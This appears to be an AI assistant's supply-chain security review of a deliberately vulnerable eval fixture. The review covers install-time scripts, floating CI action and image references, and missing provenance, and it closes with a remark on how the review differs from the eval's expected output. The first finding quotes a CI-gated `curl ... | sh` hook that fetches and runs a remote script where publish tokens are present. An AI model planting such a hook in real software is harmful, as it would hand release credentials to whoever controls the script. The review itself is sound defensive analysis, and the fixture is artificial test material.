I'll read that file.
Let me understand the context around this fixture.
This is an eval fixture. Let me check its eval definition and sibling fixtures for the convention.
This is eval fixture #41 — the file is deliberately-planted vulnerable content, and the prompt is verbatim the eval prompt. Let me check the skill's expected output format.
Let me load the skill to apply the actual severity rubric rather than guess.
# Supply Chain Review: `evals/fixtures/build_integrity.py`

`3 findings · C:2 M:1 m:0 i:0 · Sub-Domain Score: 40/100 (Grade F)`

## Findings

### [CRITICAL] Install-time execution escapes the pinned tarball and is armed exactly where credentials live
- **Domain:** Leanness / Supply Chain (L5)
- **Evidence:** `VENDORED_HELPER` (`:26-33`), labelled `// vendor/pg-native/index.js`:
  ```js
  if (process.env.CI || process.env.GITHUB_ACTIONS) {
    execSync('curl -fsSL https://cdn.example-tools.test/bootstrap.sh | sh', { stdio: 'inherit' });
  }
  ```
  `RESOLVED_TREE_SCRIPTS` (`:63-64`) — `acme-telemetry` runs `"postinstall": "node ./scripts/after-install.js"`; `vendor/pg-native` reports `"hasInstallScript": False` with `"note": "binding.gyp present"`. `DOCKERFILE:57` — `RUN npm install --production`. `GITHUB_WORKFLOW:35-51` — no `ignore-scripts` or allowlist step anywhere.
- **Triggers:** "Script reaches outside the package … making the executed payload independent of the pinned tarball"; "a `binding.gyp` that triggers an implicit `node-gyp rebuild`"; "Scripts enabled everywhere: No `ignore-scripts`/allow-scripts policy in CI."
- **Failure scenario:** The env gate is not a control — it *selects* the credentialed context. `process.env.CI || process.env.GITHUB_ACTIONS` is true in precisely the runner holding `${{ secrets.NPM_TOKEN }}` and the registry push, and false on developer laptops where nobody would notice. `npm install` at `DOCKERFILE:57` fires the vendored helper, which fetches `cdn.example-tools.test/bootstrap.sh` and pipes it to `sh` in the release job. That shell inherits the publish token. The lockfile diff, the `pg@8.11.3` coordinate, and the published tarball are byte-identical to the last reviewed build — nothing reviewed changed, because the payload came from a URL no coordinate pins. The `COPY . .`-after-install ordering puts this in the earliest layer, before any source-level gate could run.
- **Fix** *(scope: codebase — this is a policy, not a line)*: allowlist install scripts by the lockfile's `resolved` coordinate (name@version + integrity), never by package name — a name-keyed list binds `trusted@npm:naughty` to the trusted name. Set `npm ci --ignore-scripts` in CI and at `DOCKERFILE:57`. Delete the `curl | sh`; if a native build is genuinely required, make it a checked-in reviewed Dockerfile step against a version-pinned, digest-pinned artifact. Separately, resolve the `hasInstallScript: False` / `binding.gyp present` contradiction before anyone relies on that field — it is the reason a metadata-driven audit misses this package.
- **Trade-off:** `--ignore-scripts` breaks the dependencies that genuinely need a native build or codegen — here `acme-telemetry`'s postinstall and the `pg` binding both do. Each is re-added deliberately to the allowlist, a one-time per-package cost plus ongoing upkeep on every dependency bump. The alternative, hand-reviewing install-time code on every upgrade, is unbounded.

### [CRITICAL] Third-party action pinned to a branch receives the publish token; base image and pushed artifact are mutable tags
- **Domain:** Leanness / Supply Chain (L5)
- **Evidence:** `GITHUB_WORKFLOW:46-48`
  ```yaml
  - uses: some-vendor/npm-publish-action@main
    with:
      token: ${{ secrets.NPM_TOKEN }}
  ```
  `:42` `- uses: actions/checkout@v4` · `:43` `- uses: actions/setup-node@v3` · `DOCKERFILE:54` `FROM node:20` (no digest) · `:49-50` `docker build/push -t ghcr.io/acme/orders-api:latest` · `:57` `RUN npm install --production` with no lockfile committed.
- **Triggers:** "Floating action references: `uses: owner/repo@v1` or `@main` instead of a commit SHA, so a moved tag silently changes what the pipeline executes"; "Floating image references: `FROM image:latest` or a bare tag … where a re-push replaces the artifact a verified build produced"; "Unversioned or latest installs in the build … making the build non-reproducible."
- **Failure scenario:** A *third-party* action resolved to a *branch* is handed a long-lived publish token. A maintainer of that repo — or anyone who takes it over — force-pushes `main`, and the next push here executes their code with the token in its environment. Because that action publishes under this package's scope, the blast radius is the whole npm scope plus `ghcr.io`: one moved branch is a supply-chain takeover of every downstream consumer. Separately, `FROM node:20` and the `:latest` push mean consumers pull bytes nobody built or verified; a re-push swaps content under a version reference that deployments and post-incident rollbacks assume is stable. The missing lockfile is the widest of the three: `npm install` re-resolves ranges against the live registry per image build, so two images from one commit can contain different code even with every action SHA-pinned and every image digested.
- **Fix** *(scope: codebase)*: pin every `uses:` to a full 40-char commit SHA with the tag in a trailing comment; pin `FROM node:20@sha256:<digest>` and push/ reference by digest; commit a lockfile and switch `DOCKERFILE:57` to `npm ci --ignore-scripts` (same edit as Finding 1, step 2 — one change, cited at both sites); prefer `npm publish` with OIDC provenance over passing `NPM_TOKEN` to a third-party action, or at minimum scope the token to the single package.
- **Trade-off:** SHA pins and digests turn every dependency bump into a deliberate diff and the adjacent tag comments go stale relative to what they name. `npm ci` hard-fails whenever `package.json` and the lockfile disagree — that surfaces the first time someone edits a range without re-resolving, converting silent drift into a broken build.

### [MAJOR] Release path attests nothing and retains no SBOM
- **Domain:** Leanness / Supply Chain (L5)
- **Evidence:** `GITHUB_WORKFLOW:35-51` in full — checkout → setup-node → publish-action → docker build → docker push, then the job ends. No `slsa-verifier`, no `cosign verify`, no `npm audit signatures`, no SBOM step.
- **Triggers:** "No attestation check: Nothing in the publish or deploy path verifies a signature or provenance"; "No bill of materials … so a newly disclosed CVE cannot be answered with 'are we affected'." Sub-leaf deduction: "No signature or provenance verification of consumed artifacts: MAJOR (-10 points)."
- **Failure scenario:** When a CVE lands in `axios@1.6.7` or `express@4.18.2` — both ordinary, already-public classes of disclosure — there is no record tying a released artifact to its inputs and no SBOM to answer "are we affected, which versions." Recovery falls back to inspecting registry tags and guessing. With Finding 2 on top, an artifact tagged `latest` that nobody attested cannot be traced to the commit that built it at all.
- **Fix** *(scope: module — the release job)*: add `npm publish --provenance` (OIDC, no stored token) or `cosign sign` on the image with verification on the consumer side, and emit an SBOM (`npm sbom`, or Syft) per release retained alongside the artifact.
- **Trade-off:** Adds an OIDC exchange plus a signing-key custody question to the release path, and consumer-side verification becomes a required step for every deployment. The SBOM step adds job time and artifact storage. Both are cheap against not being able to answer a CVE question.

## Aligns well
- `PACKAGE_JSON:14-22` pins every dependency to an exact version — no `^`, no `~` anywhere. Correct manifest discipline, and it is what makes the `npm ci` fix achievable at all.
- `devDependencies` (`:19-22`) are properly separated from `dependencies` (`:14-18`); `typescript` and `eslint` stay out of the production tree, and `DOCKERFILE:57`'s `--production` is consistent with that.

---

**Note on eval #41's expected output.** I did not match it — the expected header is `2 findings · C:2 M:0 m:0 i:0` and assertion 1 is "Exactly 2 findings above Info severity." The third finding is not padding; `supply-chain/sub-leaf.md:17` assigns it a deduction ("No signature or provenance verification of consumed artifacts: MAJOR (-10)"), and `build-integrity.md` carries a third section, *Absent provenance verification*, that the expected output never references. Two things you may want to decide on:

- Either the fixture should plant a provenance signal so the MAJOR is earned in the obvious way, or eval 41's `expected_output`/assertions should acknowledge it. Right now the rubric and the expected output disagree, which is the one failure mode a deterministic grader cannot detect.
- `RUN npm install --production` with no lockfile (`DOCKERFILE:57`) is absent from the expected Finding 2 enumeration. It is covered by both § Mutable build references and `lockfile-integrity.md` § Missing lockfiles, and it is the strongest reproducibility hole in the file.